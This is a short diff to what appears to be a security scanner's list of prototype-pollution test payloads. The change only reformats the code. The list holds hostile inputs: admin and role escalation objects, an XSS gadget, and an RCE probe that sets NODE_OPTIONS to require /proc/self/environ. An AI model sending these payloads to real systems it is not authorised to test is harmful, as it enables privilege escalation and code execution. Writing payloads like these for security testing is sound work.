@@ -20,9 +20,20 @@ POST_PAYLOADS = [
     ({"__proto__": {"isAdmin": True}}, "__PROTO_ISADMIN"),
     ({"__proto__": {"role": "admin"}}, "__PROTO_ROLE"),
     ({"__proto__": {"polluted": "cascavel-test"}}, "__PROTO_CANARY"),
-    ({"constructor": {"prototype": {"polluted": "cascavel-test"}}}, "CONSTRUCTOR_PROTO"),
+    (
+        {"constructor": {"prototype": {"polluted": "cascavel-test"}}},
+        "CONSTRUCTOR_PROTO",
+    ),
     ({"__proto__": {"transport_url": "data:,alert(1)//"}}, "__PROTO_XSS_GADGET"),
-    ({"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/environ"}}, "__PROTO_RCE_PROBE"),
+    (
+        {
+            "__proto__": {
+                "shell": "/proc/self/exe",
+                "NODE_OPTIONS": "--require /proc/self/environ",
+            }
+        },
+        "__PROTO_RCE_PROBE",
+    ),
     # 2026 additions
     ({"__proto__": {"status": 200}}, "__PROTO_STATUS_OVERRIDE"),
     ({"__proto__": {"admin": True, "debug": True}}, "__PROTO_MULTI_FIELD"),
